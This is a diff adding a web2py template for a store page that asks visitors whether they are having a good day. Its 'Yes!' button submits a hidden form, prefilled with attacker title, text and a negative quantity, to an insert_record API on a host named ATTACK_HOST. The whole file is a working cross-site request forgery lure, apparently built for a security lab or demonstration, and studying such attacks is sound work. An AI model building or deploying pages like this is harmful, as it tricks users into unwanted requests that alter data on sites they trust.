@@ -1,0 +1,22 @@
+{{extend 'layout.html'}}
+
+{{block head}}
+{{end}}
+
+<h1>Good Day!</h1>
+
+<div>
+  <p>At our store, we strive to satisfy the customer.
+    Are you having a good day today?</p>
+  <p>
+    <form action="{{=ATTACK_HOST}}/start/api/insert_record" enctype="multipart/form-data" method="post">
+    <div style="display:none">
+      <input name="title" type="text" value="Attacker title via api">
+      <textarea name="paragraph">Attacker text via api</textarea>
+      <input name="quantity" type="number" value="-4">
+    </div>
+    <input type="submit" value="Yes!" class="btn">
+    </form>
+    <a href="{{=URL('default', 'index')}}" class="btn">No.</a>
+  </p>
+</div>
